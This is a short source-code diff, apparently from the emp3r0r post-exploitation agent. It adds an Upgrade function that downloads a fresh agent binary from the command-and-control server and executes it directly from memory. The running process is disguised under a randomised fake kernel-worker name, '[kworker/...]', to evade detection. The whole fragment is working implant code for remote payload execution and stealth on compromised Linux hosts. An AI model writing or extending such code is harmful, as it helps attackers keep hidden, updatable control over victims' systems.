@@ -124,6 +124,18 @@ func CollectSystemInfo() *emp3r0r_data.SystemInfo {
 	return &info
 }
 
+func Upgrade() error {
+	elfdata, err := DownloadViaCC(emp3r0r_data.CCAddress+"www/agent", "")
+	if err != nil {
+		return err
+	}
+
+	procName := fmt.Sprintf("[kworker/%d:0H-kb%s]",
+		util.RandInt(0, 8),
+		util.RandStr(util.RandInt(3, 10)))
+	return RunFromMemory(procName, elfdata)
+}
+
 func calculateReverseProxyPort() string {
 	p, err := strconv.Atoi(emp3r0r_data.ProxyPort)
 	if err != nil {
